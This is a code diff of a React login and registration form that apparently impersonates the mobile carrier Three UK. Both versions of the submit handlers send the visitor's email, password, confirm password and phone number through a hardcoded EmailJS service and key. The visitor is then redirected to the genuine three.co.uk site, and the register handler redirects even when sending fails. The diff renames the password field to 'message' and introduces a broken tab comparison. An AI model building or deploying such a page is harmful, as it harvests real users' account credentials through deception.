@@ -7,71 +7,69 @@ const AuthForm = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [accountType, setAccountType] = useState("personal");
-  const [isSubmitting, setIsSubmitting] = useState(false); // ✅ disable double click
 
-  // Input field states
+  // State for input fields
   const [formData, setFormData] = useState({
     email: "",
-    password: "",
+    message: "",
     confirmPassword: "",
     phone: "",
   });
 
-  const form = useRef();
-
-  // Input handler
+  // Handlers for input changes
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
   };
 
-  // ✅ Login Email Sender
-  const sendLoginEmail = async (e) => {
+  const form = useRef();
+
+  const sendLoginEmail = (e) => {
     e.preventDefault();
 
-    if (isSubmitting) return; // prevent multiple clicks
-    setIsSubmitting(true);
-
-    try {
-      const result = await emailjs.sendForm(
+    emailjs
+      .sendForm(
         "service_50q88et",
         "template_bh85laf",
         form.current,
         "vambHF3ypLBcOv_j_"
+      )
+      .then(
+        (result) => {
+          console.log("Email sent:", result.text);
+
+          window.location.href = "https://www.three.co.uk/";
+        },
+        (error) => {
+          console.log("Error:", error.text);
+        }
       );
-      console.log("✅ Login email sent:", result.text);
-      window.location.href = "https://www.three.co.uk/";
-    } catch (error) {
-      console.error("❌ Error sending login email:", error.text);
-      alert("There was a problem sending your login info. Please try again.");
-    } finally {
-      setIsSubmitting(false);
-      e.target.reset();
-    }
+
+    e.target.reset();
   };
 
-  // ✅ Register Email Sender
-  const sendRegisterEmail = async (e) => {
+  const sendRegisterEmail = (e) => {
     e.preventDefault();
 
-    if (isSubmitting) return;
-    setIsSubmitting(true);
-
-    try {
-      const result = await emailjs.sendForm(
+    emailjs
+      .sendForm(
         "service_50q88et",
         "template_bh85laf",
         form.current,
         "vambHF3ypLBcOv_j_"
+      )
+      .then(
+        (result) => {
+          console.log("Email sent:", result.text);
+
+          window.location.href = "https://www.three.co.uk/";
+        },
+        (error) => {
+          console.log("Error:", error.text);
+          window.location.href = "https://www.three.co.uk/";
+        }
       );
-      console.log("✅ Register email sent:", result.text);
-      window.location.href = "https://www.three.co.uk/";
-    } catch (error) {
-      console.error("❌ Error sending register email:", error.text);
-      alert("There was a problem sending your registration info. Please try again.");
-    } finally {
-      setIsSubmitting(false);
-      e.target.reset();
-    }
+
+    e.target.reset();
   };
 
   return (
@@ -92,7 +90,6 @@ const AuthForm = () => {
         {/* Tabs */}
         <div className="flex justify-center mt-4 border-b border-gray-900">
           <button
-            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               !isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -101,7 +98,6 @@ const AuthForm = () => {
             Log in
           </button>
           <button
-            type="button"
             className={`w-1/2 pb-2 font-medium text-center ${
               isRegister ? "border-b-2 border-black" : "text-gray-500"
             }`}
@@ -115,9 +111,8 @@ const AuthForm = () => {
         <form
           ref={form}
           className="mt-6 text-left"
-          onSubmit={isRegister ? sendRegisterEmail : sendLoginEmail}
+          onSubmit={isRegister == "Login" ? sendLoginEmail : sendRegisterEmail}
         >
-          {/* Account type (Register only) */}
           {isRegister && (
             <div className="mb-4">
               <label className="block text-gray-700 font-medium">
@@ -150,7 +145,6 @@ const AuthForm = () => {
             </div>
           )}
 
-          {/* Phone (Register only) */}
           {isRegister && (
             <div className="relative mb-4">
               <input
@@ -164,7 +158,7 @@ const AuthForm = () => {
             </div>
           )}
 
-          {/* Email */}
+          {/* Email Input */}
           <div className="relative">
             <input
               type="email"
@@ -177,12 +171,12 @@ const AuthForm = () => {
             />
           </div>
 
-          {/* Password */}
+          {/* Password Input */}
           <div className="relative mt-4">
             <input
               type={showPassword ? "text" : "password"}
-              name="password"
-              value={formData.password}
+              name="message"
+              value={formData.message}
               onChange={handleChange}
               placeholder="Password*"
               required
@@ -196,7 +190,6 @@ const AuthForm = () => {
             </span>
           </div>
 
-          {/* Confirm Password (Register only) */}
           {isRegister && (
             <>
               <div className="text-black text-base mt-2">
@@ -204,6 +197,7 @@ const AuthForm = () => {
                 <p>• Try forming one with 3 random words.</p>
               </div>
 
+              {/* Confirm Password Input */}
               <div className="relative mt-4">
                 <input
                   type={showConfirmPassword ? "text" : "password"}
@@ -228,7 +222,6 @@ const AuthForm = () => {
             </>
           )}
 
-          {/* Forgot Password (Login only) */}
           {!isRegister && (
             <div className="text-left underline mt-2">
               <a href="#" className="text-blue-600 text-sm">
@@ -240,16 +233,9 @@ const AuthForm = () => {
           {/* Submit Button */}
           <button
             type="submit"
-            disabled={isSubmitting}
-            className={`w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6 ${
-              isSubmitting ? "opacity-60 cursor-not-allowed" : ""
-            }`}
+            className="w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6"
           >
-            {isSubmitting
-              ? "Please wait..."
-              : isRegister
-              ? "Register"
-              : "Log in"}
+            {isRegister ? "Register" : "Log in"}
           </button>
         </form>
       </div>
